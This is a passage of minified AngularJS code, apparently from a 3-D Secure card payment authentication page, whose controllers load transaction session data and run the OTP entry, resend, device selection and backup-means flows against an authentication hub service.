.dateFormat,timeZone:ThisService.data[$rootScope.uniqueId].timeZone},type:MenuItemType.DATE},menuItems[menuItems.length]={label:SideMenu.CARD_NB_LABEL,value:ThisService.data[$rootScope.uniqueId].maskedPan,data:{means:ThisService.data[$rootScope.uniqueId].currentMeans,network:ThisService.data[$rootScope.uniqueId].network},type:MenuItemType.RAW_TEXT},SideMenu.replaceMenuItems(menuItems)}}}]),ACS3.controller("HomeCtrl",["$rootScope","$scope","$stateParams","$state","$window","$timeout","$translate","$amountFormat","ThisService","AuthentPagesService","SideMenu","CnButton","DeviceSelect","HelpService","Hamburger","I18N","UserExperienceService","CustomItems","LOCALES","Home","APP_STATES",function($rootScope,$scope,$stateParams,$state,$window,$timeout,$translate,$amountFormat,ThisService,AuthentPagesService,SideMenu,CnButton,DeviceSelect,HelpService,Hamburger,I18N,UserExperienceService,CustomItems,LOCALES,Home,APP_STATES){function resetCancellationSteps(){_.isNil(ThisService.data[$rootScope.uniqueId].cancellationSteps)||(ThisService.data[$rootScope.uniqueId].cancellationSteps=2)}function removePreviousDeviceFromSideMenu(){DeviceSelect.hasSelectedDevice()&&(DeviceSelect.clearDevice(),SideMenu.removeDeviceItem())}function updateAuthenData(response){ThisService.data[$rootScope.uniqueId].currentMeans=response.profile.authentMeans,ThisService.data[$rootScope.uniqueId].currentProfileName=response.profile.name,ThisService.data[$rootScope.uniqueId].dataEntryFormat=response.profile.dataEntryFormat,ThisService.data[$rootScope.uniqueId].dataEntryAllowedPattern=response.profile.dataEntryAllowedPattern,ThisService.data[$rootScope.uniqueId].meansState=response.meansState}var uniqueId;$stateParams.backup?(ThisService.data[$rootScope.uniqueId].currentMeansStep=void 0,AuthentPagesService.startBackup(ThisService.data[$rootScope.uniqueId].accountId).then(function(response){updateAuthenData(response),ThisService.data[$rootScope.uniqueId].displayUserChoice=response.displayUserChoice,resetCancellationSteps(),CustomItems.updateAuthMeans(ThisService.data[$rootScope.uniqueId].currentMeans),UserExperienceService.addUserAuthent(MeansTriggeringEvent.BACKUP),removePreviousDeviceFromSideMenu(),ThisService.data[$rootScope.uniqueId].meansState===APP_STATES.REFUSAL?($state.go(APP_STATES.REFUSAL,{backup:!0}),$timeout(function(){$state.go(APP_STATES.EXIT)},1e4)):(CnButton.setDisable(!1),$state.go(ThisService.data[$rootScope.uniqueId].meansState,{backup:!0}))})):$stateParams.choice?(ThisService.data[$rootScope.uniqueId].currentMeansStep=void 0,AuthentPagesService.startChoice(ThisService.data[$rootScope.uniqueId].accountId,$stateParams.means).then(function(response){updateAuthenData(response),ThisService.data[$rootScope.uniqueId].displayUserChoice=response.displayUserChoice,resetCancellationSteps(),CustomItems.updateAuthMeans(ThisService.data[$rootScope.uniqueId].currentMeans),UserExperienceService.addUserAuthent(MeansTriggeringEvent.CHOICE),removePreviousDeviceFromSideMenu(),CnButton.setDisable(!1),$state.go(ThisService.data[$rootScope.uniqueId].meansState,{choice:!0})})):$stateParams.combine?(ThisService.data[$rootScope.uniqueId].currentMeansStep=void 0,AuthentPagesService.startCombine(ThisService.data[$rootScope.uniqueId].accountId).then(function(response){updateAuthenData(response),resetCancellationSteps(),CustomItems.updateAuthMeans(ThisService.data[$rootScope.uniqueId].currentMeans),UserExperienceService.addUserAuthent(MeansTriggeringEvent.COMBINED),removePreviousDeviceFromSideMenu(),ThisService.data[$rootScope.uniqueId].meansState===APP_STATES.REFUSAL?$state.go(APP_STATES.REFUSAL):(CnButton.setDisable(!1),$state.go(ThisService.data[$rootScope.uniqueId].meansState,{combine:!0}))})):($rootScope.uniqueId=$stateParams.uniqueId,ThisService.data[$rootScope.uniqueId]?Math.floor(Date.now())-ThisService.data[$rootScope.uniqueId].dateTime>=ThisService.data[$rootScope.uniqueId].timeout?(ThisService.data.redirectionAllowed=!0,$window.location.href="403.html"):(Home.fillMenus(),$translate.use(ThisService.data[$rootScope.uniqueId].issuerDefaultLanguage),$translate.refresh().then(function(){$state.go(ThisService.data[$rootScope.uniqueId].meansState)})):(ThisService.data[$rootScope.uniqueId]={},uniqueId=$stateParams.uniqueId,AuthentPagesService.getSessionByUniqueId(uniqueId,function(){var iframeScan={inIframe:!1,parentUrl:null};return parent!==window&&(iframeScan.inIframe=!0,iframeScan.parentUrl=document.referrer),iframeScan}()).then(function(response){ThisService.data[$rootScope.uniqueId].dateTime=Math.floor(Date.now()),ThisService.data[$rootScope.uniqueId].timeout=response.data.authenticationTimeOut,ThisService.data.customTexts=response.data.customTexts,ThisService.data.customImages=response.data.customImages,ThisService.data.customFonts=response.data.customFonts,ThisService.data.imageData=response.data.imageData,ThisService.data.fontData=response.data.fontData,ThisService.data[$rootScope.uniqueId].returnURL=response.data.pagesServiceParam.returnURL,ThisService.data[$rootScope.uniqueId].returnPath=response.data.pagesServiceParam.returnPath,ThisService.data[$rootScope.uniqueId].accountId=response.data.accountId,ThisService.data[$rootScope.uniqueId].issuer=response.data.issuer,ThisService.data[$rootScope.uniqueId].hubSessionId=response.data.hubSessionId,ThisService.data[$rootScope.uniqueId].externalWSResponse=response.data.externalWSResponse,ThisService.data[$rootScope.uniqueId].currentMeans=response.data.profile.authentMeans,ThisService.data[$rootScope.uniqueId].meansState=response.data.meansState,ThisService.data[$rootScope.uniqueId].dataEntryFormat=response.data.profile.dataEntryFormat,ThisService.data[$rootScope.uniqueId].dataEntryAllowedPattern=response.data.profile.dataEntryAllowedPattern,ThisService.data[$rootScope.uniqueId].backupAllowed=response.data.backupAllowed,ThisService.data[$rootScope.uniqueId].userChoiceAllowed=response.data.userChoiceAllowed,ThisService.data[$rootScope.uniqueId].displayUserChoice=response.data.displayUserChoice,ThisService.data[$rootScope.uniqueId].defaultDeviceChoice=response.data.defaultDeviceChoice,ThisService.data[$rootScope.uniqueId].network=response.data.network,ThisService.data[$rootScope.uniqueId].amount=response.data.transactionData.originalAmount,ThisService.data[$rootScope.uniqueId].currency=response.data.transactionData.originalCurrency,ThisService.data[$rootScope.uniqueId].exponent=response.data.transactionData.originalExponent,ThisService.data[$rootScope.uniqueId].displayNullAmount=response.data.transactionData.displayNullAmount,ThisService.data[$rootScope.uniqueId].cancellationSteps=response.data.transactionData.cancelTransactionInTwoSteps?2:null,ThisService.data[$rootScope.uniqueId].merchantName=response.data.transactionData.merchantName,ThisService.data[$rootScope.uniqueId].date=response.data.transactionData.date,ThisService.data[$rootScope.uniqueId].dateFormat=response.data.transactionData.dateFormat,ThisService.data[$rootScope.uniqueId].purchaseDateFormat=response.data.transactionData.purchaseDateFormat,ThisService.data[$rootScope.uniqueId].timeZone=response.data.transactionData.timeZone,ThisService.data[$rootScope.uniqueId].maskedPan=response.data.transactionData.maskedPan,ThisService.data[$rootScope.uniqueId].timerValue=0,ThisService.data[$rootScope.uniqueId].filterKeys=response.data.filterKeys,ThisService.data[$rootScope.uniqueId].filterValues=response.data.filterValues,ThisService.data[$rootScope.uniqueId].availableInitChoices=response.data.availableInitChoices,ThisService.data[$rootScope.uniqueId].pageLayouts=response.data.pageLayouts,ThisService.data[$rootScope.uniqueId].issuerBackupLanguages=response.data.issuerBackupLanguages,ThisService.data[$rootScope.uniqueId].issuerDefaultLanguage=response.data.issuerDefaultLanguage,ThisService.data[$rootScope.uniqueId].hubDrivenMeansChoice=response.data.hubDrivenMeansChoice,ThisService.data[$rootScope.uniqueId].currentProfileName=response.data.profile.name,ThisService.data[$rootScope.uniqueId].refreshHubSessionCounter=response.data.counters.refreshHubSessionCounter,ThisService.data[$rootScope.uniqueId].resendOTPCounter=response.data.counters.resendOTPCounter,ThisService.data[$rootScope.uniqueId].refusalCause=response.data.refusalCause,ThisService.data[$rootScope.uniqueId].combinedAuthenticationAllowed=response.data.combinedAuthenticationAllowed,ThisService.data[$rootScope.uniqueId].enrolTrustedBeneficiary=response.data.enrolTrustedBeneficiary,ThisService.data[$rootScope.uniqueId].trustedBeneficiariesAllowed=response.data.trustedBeneficiariesAllowed,ThisService.data[$rootScope.uniqueId].useAlphaCurrencySymbol=response.data.useAlphaCurrencySymbol,ThisService.data[$rootScope.uniqueId].currencySymbolPosition=response.data.currencySymbolPosition,ThisService.data[$rootScope.uniqueId].issuerResendOtpThreshold=response.data.issuerResendOtpThreshold,ThisService.data[$rootScope.uniqueId].decimalDelimiter=response.data.decimalDelimiter,ThisService.data[$rootScope.uniqueId].thousandDelimiter=response.data.thousandDelimiter,UserExperienceService.addUserAuthent(response.data.meansTriggeringEvent);var language=$translate.proposedLanguage()||$translate.use();if(LOCALES.availableLocales.hasOwnProperty(language)){var amountFormat=LOCALES.availableLocales[language].amountFormat;ThisService.data[$rootScope.uniqueId].filterValues[7]=$amountFormat.format(ThisService.data[$rootScope.uniqueId].amount,ThisService.data[$rootScope.uniqueId].exponent,ThisService.data[$rootScope.uniqueId].currency,amountFormat.thousand,amountFormat.decimal,amountFormat.format,!0,ThisService.data[$rootScope.uniqueId].useAlphaCurrencySymbol,ThisService.data[$rootScope.uniqueId].currencySymbolPosition,ThisService.data[$rootScope.uniqueId].thousandDelimiter,ThisService.data[$rootScope.uniqueId].decimalDelimiter)}Home.fillMenus(),$translate.refresh().then(function(){$state.go(ThisService.data[$rootScope.uniqueId].meansState)})},function(response){for(var prop in $rootScope)$rootScope.hasOwnProperty(prop)&&0===prop.lastIndexOf("deferred",0)&&$rootScope[prop].resolve(prop.substring("deferred".length,prop.length));ThisService.data.redirectionAllowed=!0,_.isEqual(response.status,403)?$window.location.href="403.html":$window.location.href="500.html"})))}]),ACS3.component("info",{templateUrl:"app/components/InfoModule/info.html",controller:"InfoCtrl"}),ACS3.controller("InfoCtrl",["$scope","$rootScope","AuthentPagesService","$state","$timeout","ThisService","CnButton","ValButton","CustomItems","SplashScreen","UserExperienceService","MessageBanner","APP_STATES",function($scope,$rootScope,AuthentPagesService,$state,$timeout,ThisService,CnButton,ValButton,CustomItems,SplashScreen,UserExperienceService,MessageBanner,APP_STATES){ThisService.data[$rootScope.uniqueId].filterValues[4]<0?$state.go(APP_STATES.FAILURE):($scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network,SplashScreen.hide(),ThisService.data[$rootScope.uniqueId].pageType="INFO_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),CustomItems.updateFilterValue(4,ThisService.data[$rootScope.uniqueId].filterValues[4]),$scope.layoutData=CustomItems.getCustomPageLayout(),ValButton.setDisable(!1),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.INFO_ACCEPT),$scope.validate=function(){CnButton.setDisable(!0),ValButton.setDisable(!0),AuthentPagesService.acceptTransaction(ThisService.data[$rootScope.uniqueId].accountId).then(function(hubResponse){hubResponse.authentTerminated?(MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS),UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS)):(MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.TECHNICAL_ERROR),UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR)),$timeout(function(){$state.go(APP_STATES.EXIT)},2e3)})},ValButton.setAction($scope.validate))}]),ACS3.component("otp",{templateUrl:"app/components/OTPModule/otp.html",controller:"OTPCtrl"}),ACS3.controller("OTPCtrl",["$scope","$rootScope","$state","$translate","$timeout","$replace","AuthentPagesService","Hamburger","MessageBanner","ThisService","SideMenu","DeviceSelect","OtpRecorder","SplashScreen","CnButton","SwitchMeansButton","CustomItems","LOCALES","UserExperienceService","ValButton","ReSendOTP","RefreshPhoneNumber","cvvRecorder","ExternalImageService","MeansSelectMenu","APP_STATES","MerchantWhiteList","ChiptanService","ERROR_CONST",function($scope,$rootScope,$state,$translate,$timeout,$replace,AuthentPagesService,Hamburger,MessageBanner,ThisService,SideMenu,DeviceSelect,OtpRecorder,SplashScreen,CnButton,SwitchMeansButton,CustomItems,LOCALES,UserExperienceService,ValButton,ReSendOTP,RefreshPhoneNumber,cvvRecorder,ExternalImageService,MeansSelectMenu,APP_STATES,MerchantWhiteList,ChiptanService,ERROR_CONST){var OTP="otp";$scope.step=ThisService.data[$rootScope.uniqueId].currentMeansStep,$scope.displayMerchantWhitelistChoice=ThisService.data[$rootScope.uniqueId].enrolTrustedBeneficiary&&ThisService.data[$rootScope.uniqueId].trustedBeneficiariesAllowed,$scope.deviceSelectValues=[],$scope.selectForm={validateDisabled:!0,choiceDisabled:!1},$scope.otpForm={validateDisabled:!0,choiceDisabled:!1},$scope.userChoiceAllowed=ThisService.data[$rootScope.uniqueId].userChoiceAllowed&&ThisService.data[$rootScope.uniqueId].displayUserChoice,$scope.means=ThisService.data[$rootScope.uniqueId].currentMeans,$scope.network=ThisService.data[$rootScope.uniqueId].network,$state.params.backup&&!DeviceSelect.hasSelectedDevice()&&(OtpRecorder.setDisable(!1),MessageBanner.display($scope.network,$scope.means,"OTP_FORM_PAGE",MessageBanner.BACKUP_TRIGGERED)),$state.params.combine&&ReSendOTP.setDisable(!1),DeviceSelect.subscribe($scope,function(){$scope.selectForm.validateDisabled=!DeviceSelect.hasSelectedDevice(),ValButton.setDisable(!DeviceSelect.hasSelectedDevice())}),OtpRecorder.subscribe($scope,function(){$scope.otpForm.validateDisabled=!OtpRecorder.hasEnteredOtp(),ValButton.setDisable(!OtpRecorder.hasEnteredOtp())}),SwitchMeansButton.setDisplay($scope.userChoiceAllowed),SwitchMeansButton.setDisable(!$scope.userChoiceAllowed),ThisService.onDeath($scope,function(){$scope.selectForm.validateDisabled=!0,$scope.selectForm.choiceDisabled=!0,$scope.otpForm.validateDisabled=!0,$scope.otpForm.choiceDisabled=!0,DeviceSelect.setDisabled(!0),ReSendOTP.setDisable(!0),OtpRecorder.setDisable(!0),SwitchMeansButton.setDisable(!0),ValButton.setDisable(!0)});function updateResendOTPDisplay(){ThisService.data[$rootScope.uniqueId].resendOTPCounter>=ThisService.data[$rootScope.uniqueId].issuerResendOtpThreshold&&ReSendOTP.setDisable(!0)}updateResendOTPDisplay();function updateRefreshSessionDisplay(){1<=ThisService.data[$rootScope.uniqueId].refreshHubSessionCounter&&RefreshPhoneNumber.setDisable(!0)}updateRefreshSessionDisplay();_.has(ThisService.data[$rootScope.uniqueId],"refreshSession")&&(ThisService.data[$rootScope.uniqueId].refreshSession?MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.REFRESH_SESSION_CHANGED):MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.REFRESH_SESSION_UNCHANGED),delete ThisService.data[$rootScope.uniqueId].refreshSession),$scope.validateDevice=function(){ThisService.data[$rootScope.uniqueId].currentMeansStep="select_validating",CnButton.setDisable(!0),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.OTP_SENDING);var language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){var selectPhoneUpdateAuthent={};selectPhoneUpdateAuthent.language=language,selectPhoneUpdateAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,selectPhoneUpdateAuthent.step="select_validating",selectPhoneUpdateAuthent.hubAuthenticationInput={},selectPhoneUpdateAuthent.hubAuthenticationInput.chosenDeviceId=DeviceSelect.selectedDeviceId,$scope.selectForm.validateDisabled=!0,$scope.selectForm.choiceDisabled=!0,AuthentPagesService.updateAuthentication(selectPhoneUpdateAuthent).then(function(hubResponse){$timeout(function(){MessageBanner.hideMessage(),hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),$scope.useBackup()):(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS),ThisService.data[$rootScope.uniqueId].chosenDeviceId=DeviceSelect.selectedDeviceId,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=DeviceSelect.selectedDevice,updateMenusAndLabel($scope.step=OTP))},2500)})})},$scope.reSendOTPfct=function(){UserExperienceService.track(UserActionType.RE_SEND_OTP,ReactionLevel.SUCCESS),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.OTP_RESEND);var language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){var enterOTPUpdateAuthent={};enterOTPUpdateAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(enterOTPUpdateAuthent.region=LOCALES.availableLocales[language].region),enterOTPUpdateAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,enterOTPUpdateAuthent.step="resend_otp_"+ThisService.data[$rootScope.uniqueId].resendOTPCounter,enterOTPUpdateAuthent.hubAuthenticationInput={},enterOTPUpdateAuthent.hubAuthenticationInput.sendAgain=!0,enterOTPUpdateAuthent.hubAuthenticationInput.language=$translate.proposedLanguage()||$translate.use(),AuthentPagesService.updateAuthentication(enterOTPUpdateAuthent).then(function(){$timeout(function(){ThisService.data[$rootScope.uniqueId].resendOTPCounter++,updateResendOTPDisplay(),MessageBanner.hideMessage()},2500)})})};function updateAuthenData(hubResponse){ThisService.data[$rootScope.uniqueId].currentMeans=hubResponse.meansToUse,ThisService.data[$rootScope.uniqueId].currentProfileName=hubResponse.profileName,ThisService.data[$rootScope.uniqueId].dataEntryFormat=hubResponse.dataEntryFormat,ThisService.data[$rootScope.uniqueId].dataEntryAllowedPattern=hubResponse.dataEntryAllowedPattern}var refreshHubSession=function(){MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.REFRESH_SESSION),AuthentPagesService.refreshHubSession(ThisService.data[$rootScope.uniqueId].accountId).then(function(hubResponse){MessageBanner.hideMessage(),UserExperienceService.track(UserActionType.REFRESH_PHONE_NUMBER_CLICK,ReactionLevel.SUCCESS),ThisService.data[$rootScope.uniqueId].refreshSession=hubResponse.phoneNumberChanged,ThisService.data[$rootScope.uniqueId].refreshHubSessionCounter++,updateRefreshSessionDisplay(),delete ThisService.data[$rootScope.uniqueId].currentMeansStep,$state.reload()})},filterChallengeValues=function(challenges){if(_.isEmpty(challenges))ExternalImageService.setDisplayed(!1);else{for(var i=0;i<challenges.length;i++)CustomItems.updateFilterValue(10+i,challenges[i]);ChiptanService.setChallenge(challenges[0]),ExternalImageService.setImageBase64Value(challenges[0]),ExternalImageService.setDisplayed(!0)}};if($scope.validateOTP=function(){$scope.otpForm.choiceDisabled=!0,$scope.otpForm.validateDisabled=!0,ThisService.data[$rootScope.uniqueId].currentMeansStep="otp_validating",_.isNil(ThisService.data[$rootScope.uniqueId].cancellationSteps)||(ThisService.data[$rootScope.uniqueId].cancellationSteps=2),ReSendOTP.setDisable(!0),OtpRecorder.setDisable(!0),CnButton.setDisable(!0),SwitchMeansButton.setDisable(!0),ValButton.setDisable(!0),ThisService.data[$rootScope.uniqueId].skipHubCall||MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENTICATION_IN_PROGRESS),ThisService.data[$rootScope.uniqueId].skipHubCall&&MessageBanner.hideMessage();var language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){var enterOTPUpdateAuthent={};enterOTPUpdateAuthent.language=language,enterOTPUpdateAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,enterOTPUpdateAuthent.step=ThisService.data[$rootScope.uniqueId].currentMeansStep+"_"+CustomItems.filterValues[4],enterOTPUpdateAuthent.skipCurrentHubCall=ThisService.data[$rootScope.uniqueId].skipHubCall,enterOTPUpdateAuthent.hubAuthenticationInput={},enterOTPUpdateAuthent.hubAuthenticationInput.otp=OtpRecorder.enteredOtp,enterOTPUpdateAuthent.hubAuthenticationInput.merchantWhitelistedByUser=MerchantWhiteList.selectedMerchantWhitelisting,cvvRecorder.enteredCvv&&(enterOTPUpdateAuthent.hubAuthenticationInput.cvv=cvvRecorder.enteredCvv),AuthentPagesService.updateAuthentication(enterOTPUpdateAuthent).then(function(hubResponse){$timeout(function(){hubResponse.anotherAuthentNeeded?(ThisService.data[$rootScope.uniqueId].currentMeansStep="end",UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS,MessageLevel.SUCCESS,DisplayType.CLOSABLE),CnButton.setDisable(!0),SwitchMeansButton.setDisable(!1),$timeout(function(){SplashScreen.splash(SplashMode.ENTER_MESSAGE),$state.go(APP_STATES.HOME,{combine:!0})},2500)):hubResponse.authentTerminated?function(hubResponse){ThisService.data[$rootScope.uniqueId].currentMeansStep="end",ThisService.prepareExit(),hubResponse.hubAuthenticationOutput.authenticationSuccess?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.SUCCESS),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.AUTHENT_SUCCESS),CnButton.setDisable(!0),$timeout(function(){$state.go(APP_STATES.EXIT)},5e3)):(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),$state.go(APP_STATES.FAILURE));var endAuthentication={};endAuthentication.accountId=ThisService.data[$rootScope.uniqueId].accountId,endAuthentication.hubAuthenticationInput={},AuthentPagesService.endAuthentication(endAuthentication).then(function(){ThisService.readyExit()})}(hubResponse):hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),$scope.useBackup()):hubResponse.hubAuthenticationOutput.externalWsUnavailable?(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),ThisService.data[$rootScope.uniqueId].failureCause="AUTHENTICATION_FAILED",ThisService.prepareExit(),ThisService.readyExit(),$state.go(APP_STATES.FAILURE)):(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),$scope.otpForm.choiceDisabled=!1,$scope.otpForm.validateDisabled=!1,ThisService.data[$rootScope.uniqueId].currentMeansStep=OTP,ReSendOTP.setDisable(!1),updateResendOTPDisplay(),OtpRecorder.setDisable(!1),OtpRecorder.clearOtp(),cvvRecorder.clearCvv(),CnButton.setDisable(!1),SwitchMeansButton.setDisable(!1),hubResponse.skipHubCall?(ThisService.data[$rootScope.uniqueId].skipHubCall=!1,updateAuthenData(hubResponse),CustomItems.updateAuthMeans(hubResponse.meansToUse),$scope.layoutData=CustomItems.getCustomPageLayout()):(_.isEqual(hubResponse.trialsLeft,CustomItems.filterValues[4])?CustomItems.updateFilterValue(4,hubResponse.trialsLeft-1):CustomItems.updateFilterValue(4,hubResponse.trialsLeft),MessageBanner.display($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,MessageBanner.BAD_OTP),hubResponse.retryFromFirstStep&&(ThisService.data[$rootScope.uniqueId].skipHubCall=!0,updateAuthenData(hubResponse),CustomItems.updateAuthMeans(hubResponse.meansToUse),$scope.layoutData=CustomItems.getCustomPageLayout())))},2500)},function(errResp){(errResp.data&&_.startsWith(errResp.data,ERROR_CONST.TOO_MANY_OTP_TRIES)||errResp.data&&_.startsWith(errResp.data,ERROR_CONST.UNAUTHORIZED_CHOICE))&&(UserExperienceService.track(UserActionType.VALIDATE,ReactionLevel.ERROR),$state.go(APP_STATES.FAILURE))})})},$scope.step)updateMenusAndLabel($scope.step);else{var newAuthent={};newAuthent.accountId=ThisService.data[$rootScope.uniqueId].accountId,newAuthent.hubAuthenticationInput={};var language=$translate.proposedLanguage()||$translate.use();ThisService.whenCustomItemsReady(language).then(function(){newAuthent.language=language,LOCALES.availableLocales.hasOwnProperty(language)&&(newAuthent.region=LOCALES.availableLocales[language].region),newAuthent.hubAuthenticationInput.transactionContext={},AuthentPagesService.startAuthentication(newAuthent).then(function(hubResponse){hubResponse.meansToUse&&hubResponse.meansToUseState!==APP_STATES.OTP?(ThisService.data[$rootScope.uniqueId].externalWSResponse=hubResponse.hubAuthenticationOutput.externalWSResponse,$state.go(hubResponse.meansToUseState)):hubResponse.hubAuthenticationOutput.externalTechnicalErrorBackupAllowed?$scope.useBackup():(MerchantWhiteList.setDisplay($scope.displayMerchantWhitelistChoice),_.isEmpty(hubResponse.hubAuthenticationOutput.challenges)||(ThisService.data[$rootScope.uniqueId].challenges=hubResponse.hubAuthenticationOutput.challenges),!function(hubResponse){return hubResponse.hubAuthenticationOutput.deviceMap&&0!==hubResponse.hubAuthenticationOutput.deviceMap.length}(hubResponse)?updateMenusAndLabel($scope.step=OTP):(ThisService.data[$rootScope.uniqueId].deviceMap=hubResponse.hubAuthenticationOutput.deviceMap,!function(hubResponse){return hubResponse.hubAuthenticationOutput.chosenDeviceId&&0!==hubResponse.hubAuthenticationOutput.chosenDeviceId.length&&hubResponse.hubAuthenticationOutput.chosenDeviceValue&&0!==hubResponse.hubAuthenticationOutput.chosenDeviceValue.length}(hubResponse)?updateMenusAndLabel($scope.step="select"):(ThisService.data[$rootScope.uniqueId].chosenDeviceId=hubResponse.hubAuthenticationOutput.chosenDeviceId,ThisService.data[$rootScope.uniqueId].chosenDeviceValue=hubResponse.hubAuthenticationOutput.chosenDeviceValue,updateMenusAndLabel($scope.step=OTP)))),ThisService.data[$rootScope.uniqueId].hubAuthentId=hubResponse.hubAuthenticationOutput.id,ThisService.data[$rootScope.uniqueId].skipHubCall=hubResponse.skipHubCall})})}function updateMenusAndLabel(step){if(ThisService.data[$rootScope.uniqueId].currentMeansStep=step,SplashScreen.hide(),"select"===step){for(var id in ValButton.setAction($scope.validateDevice),ValButton.setDisable(!0),ThisService.data[$rootScope.uniqueId].pageType="CHOICE_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout(),Hamburger.updateCustomTextKey($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType),SwitchMeansButton.setSwitchMeansButtonInfo(void 0,$scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,SwitchMeansButton.MISSING_DEVICE),CnButton.setDisable(!1),DeviceSelect.hasSelectedDevice()&&(DeviceSelect.clearDevice(),SideMenu.removeDeviceItem()),ThisService.data[$rootScope.uniqueId].deviceMap)$scope.deviceSelectValues.push({id:id,value:ThisService.data[$rootScope.uniqueId].deviceMap[id]});DeviceSelect.setDevices($scope.deviceSelectValues)}else if("select_validating"===step){for(var id in $scope.step="select",ThisService.data[$rootScope.uniqueId].deviceMap)$scope.deviceSelectValues.push({id:id,value:ThisService.data[$rootScope.uniqueId].deviceMap[id]});DeviceSelect.setDevices($scope.deviceSelectValues),$scope.validateDevice()}else step===OTP?(MerchantWhiteList.setDisplay($scope.displayMerchantWhitelistChoice),ValButton.setAction($scope.validateOTP),OtpRecorder.setDisable(!1),ValButton.setDisable(!1),ReSendOTP.setReSendOTPAction($scope.reSendOTPfct),RefreshPhoneNumber.setRefreshButtonAction(refreshHubSession),ThisService.data[$rootScope.uniqueId].pageType="OTP_FORM_PAGE",CustomItems.switchPageType(ThisService.data[$rootScope.uniqueId].pageType),$scope.layoutData=CustomItems.getCustomPageLayout(),Hamburger.updateCustomTextKey($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType),SwitchMeansButton.setSwitchMeansButtonInfo(void 0,$scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,SwitchMeansButton.SWITCH_MEANS_LABEL),MeansSelectMenu.setMeans($scope.network,$scope.means,ThisService.data[$rootScope.uniqueId].pageType,ThisService.data[$rootScope.uniqueId].availableInitChoices),ThisService.data[$rootScope.uniqueId].chosenDeviceId&&(DeviceSelect.updateDevice({id:ThisService.data[$rootScope.uniqueId].chosenDeviceId,value:ThisService.data[$rootScope.uniqueId].chosenDeviceValue}),SideMenu.removeDeviceItem(),SideMenu.addMenuItem({label:SideMenu.SELECTED_DEVICE_MENU_LABEL,value:DeviceSelect.selectedDevice,data:{means:$scope.means,network:$scope.network},type:MenuItemType.DEVICE})),CnButton.setDisable(!1),filterChallengeValues(ThisService.data[$rootScope.uniqueId].challenges)):"otp_validating"===step?($scope.step=OTP,$scope.validateOTP()):"end"===step&&(ThisService.readyExit(),$state.go(APP_STATES.EXIT))}$scope.postOnEnter=function($event){13!==($event.which||$event.keyCode)||$scope.otpForm.validateDisabled||$scope.validateOTP()},$scope.useBackup=function(){$state.go(APP_STATES.HOME,{backup:!0})}}]),ACS3.component("poll",{templateUrl:"app/components/PollModule/poll.html",controller:"PollCtrl"}),ACS3.controller("PollCtrl",["$scope","$rootScope","$state","$unloadEvent","$window","$timeout","$translate","ThisService","SplashScreen","CnButton","SwitchMeansButton","CustomItems","AuthentPagesService","Hamburger","MessageBanner","UserExperienceService","DeviceSelect","ValButton","SideMenu","LOCALES","APP_STATES","ExternalImageService","STATUS_PENDING","ExternalLinkService","IntervalByBrowserActivity",function($scope,$rootScope,$state,$unloadEvent,$window,$timeout,$translate,ThisService,SplashScreen,CnButton,SwitchMeansButton,CustomItems,AuthentPagesService,Hamburger,MessageBanner,UserExperienceService,DeviceSelect,ValButton,SideMenu,LOCALES,APP_STATES,ExternalImageService,STATUS_PENDING,ExternalLinkService,IntervalByBrowserActivity){var 